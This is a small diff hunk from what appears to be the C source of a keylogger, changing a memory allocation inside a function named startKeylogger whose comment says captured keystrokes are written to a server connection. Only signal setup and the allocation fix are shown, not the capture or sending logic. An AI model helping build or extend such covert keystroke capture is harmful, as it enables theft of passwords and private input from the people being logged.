@@ -30,7 +30,7 @@ void startKeylogger(int keyboard, int fd)
 
     sigaction(SIGTERM, &sa, NULL);
     sigaction(SIGPIPE, &sa, NULL);
-    kbd_events = malloc(sizeof(event) * MAX_EVENTS);
+    kbd_events = malloc(event_size * MAX_EVENTS);
 
     while (!STOP_KEYLOGGER) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
     {
